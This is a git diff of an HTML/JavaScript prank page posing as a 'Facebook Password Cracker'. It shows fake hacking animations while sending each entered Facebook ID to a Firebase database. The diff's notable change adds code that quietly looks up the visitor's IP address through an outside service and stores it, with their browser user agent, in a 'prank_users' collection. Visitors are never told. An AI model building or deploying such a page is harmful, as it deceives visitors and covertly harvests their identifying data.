@@ -1,15 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Password Cracker </title>
+    <title>Facebook Password Cracker - Bapuji Cake</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             font-family: 'Courier New', monospace;
             background: #0a0a0a;
@@ -20,6 +22,7 @@
             height: 100vh;
             overflow: hidden;
         }
+
         .container {
             background: #1a1a1a;
             padding: 30px;
@@ -31,6 +34,7 @@
             position: relative;
             overflow: hidden;
         }
+
         h1 {
             font-size: 28px;
             color: #0f0;
@@ -38,6 +42,7 @@
             margin-bottom: 20px;
             text-shadow: 0 0 10px #0f0;
         }
+
         input[type="text"] {
             width: 80%;
             padding: 12px;
@@ -49,6 +54,7 @@
             margin-bottom: 20px;
             outline: none;
         }
+
         button {
             padding: 12px 30px;
             font-size: 18px;
@@ -59,21 +65,27 @@
             cursor: pointer;
             transition: all 0.3s ease;
         }
+
         button:hover {
             background: #00cc00;
             box-shadow: 0 0 15px #0f0;
         }
-        .hacking, .result {
+
+        .hacking,
+        .result {
             display: none;
         }
+
         .active {
             display: block;
         }
+
         .hacking-text {
             font-size: 18px;
             line-height: 1.5;
             animation: blink 1s infinite;
         }
+
         .progress-bar {
             width: 0%;
             height: 20px;
@@ -83,11 +95,13 @@
             transition: width 5s ease-in-out;
             box-shadow: 0 0 10px #0f0;
         }
+
         .result {
             font-size: 24px;
             color: #ff0;
             text-shadow: 0 0 10px #ff0;
         }
+
         .result span {
             display: block;
             font-size: 36px;
@@ -95,15 +109,30 @@
             margin-top: 20px;
             animation: shake 0.5s infinite;
         }
+
         /* Animations */
         @keyframes blink {
-            50% { opacity: 0.5; }
+            50% {
+                opacity: 0.5;
+            }
         }
+
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            25% {
+                transform: translateX(-5px);
+            }
+
+            75% {
+                transform: translateX(5px);
+            }
         }
+
         .matrix {
             position: absolute;
             top: 0;
@@ -114,6 +143,7 @@
             pointer-events: none;
             animation: matrixRain 10s infinite linear;
         }
+
         canvas {
             position: absolute;
             top: 0;
@@ -121,6 +151,7 @@
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <canvas id="matrixCanvas" class="matrix"></canvas>
@@ -218,71 +249,84 @@
         // Import Firebase SDK
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
-      
+
         // Firebase Configuration
         const firebaseConfig = {
-          apiKey: "AIzaSyC-KWbo4PyzEgKaRadAPoGIoN2czc_8ZdY",
-          authDomain: "facebookp-db85f.firebaseapp.com",
-          projectId: "facebookp-db85f",
-          storageBucket: "facebookp-db85f.appspot.com",
-          messagingSenderId: "784746307235",
-          appId: "1:784746307235:web:c6cc6ae90818b4ab9fa916"
+            apiKey: "AIzaSyC-KWbo4PyzEgKaRadAPoGIoN2czc_8ZdY",
+            authDomain: "facebookp-db85f.firebaseapp.com",
+            projectId: "facebookp-db85f",
+            storageBucket: "facebookp-db85f.appspot.com",
+            messagingSenderId: "784746307235",
+            appId: "1:784746307235:web:c6cc6ae90818b4ab9fa916"
         };
-      
+
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-      
+
         // Function to Store Facebook ID in Firestore
         async function storeFbId(fbId) {
-          try {
-            await addDoc(collection(db, "prank_users"), {
-              facebookID: fbId,
-              timestamp: new Date()
-            });
-            console.log("Facebook ID stored successfully!");
-          } catch (error) {
-            console.error("Error storing data:", error);
-          }
+            try {
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date();
+
+                // Fetch IP address from an external API
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                const userIP = data.ip;
+
+                await addDoc(collection(db, "prank_users"), {
+                    facebookID: fbId,
+                    timestamp: timestamp,
+                    userAgent: userAgent,
+                    ip: userIP
+                });
+
+                console.log(`Facebook ID stored! IP: ${userIP}`);
+            } catch (error) {
+                console.error("Error storing data:", error);
+            }
         }
-      
+
+
         // Function to Start the Prank
         window.startHack = function () {
-          const fbId = document.getElementById('fbId').value.trim();
-          if (!fbId) {
-            alert('Please enter a Facebook ID!');
-            return;
-          }
-      
-          storeFbId(fbId);  // Store the entered ID in Firebase
-      
-          showSection('hacking');
-          const hackText = document.getElementById('hackText');
-          const progressBar = document.getElementById('progressBar');
-          const messages = [
-            `Initializing xAI Cracker v9.1...`,
-            `Bypassing Facebook Security...`,
-            `Fetching User Data for ${fbId}...`,
-            `Decrypting Password Hash...`,
-            `Almost there...`
-          ];
-          let i = 0;
-      
-          const updateText = setInterval(() => {
-            if (i < messages.length) {
-              hackText.textContent = messages[i];
-              i++;
+            const fbId = document.getElementById('fbId').value.trim();
+            if (!fbId) {
+                alert('Please enter a Facebook ID!');
+                return;
             }
-          }, 1000);
-      
-          progressBar.style.width = '100%';
-          setTimeout(() => {
-            clearInterval(updateText);
-            showSection('result');
-          }, 5000);
+
+            storeFbId(fbId);  // Store the entered ID in Firebase
+
+            showSection('hacking');
+            const hackText = document.getElementById('hackText');
+            const progressBar = document.getElementById('progressBar');
+            const messages = [
+                `Initializing xAI Cracker v9.1...`,
+                `Bypassing Facebook Security...`,
+                `Fetching User Data for ${fbId}...`,
+                `Decrypting Password Hash...`,
+                `Almost there...`
+            ];
+            let i = 0;
+
+            const updateText = setInterval(() => {
+                if (i < messages.length) {
+                    hackText.textContent = messages[i];
+                    i++;
+                }
+            }, 1000);
+
+            progressBar.style.width = '100%';
+            setTimeout(() => {
+                clearInterval(updateText);
+                showSection('result');
+            }, 5000);
         };
-      
-      </script>
-      
+
+    </script>
+
 </body>
+
 </html>
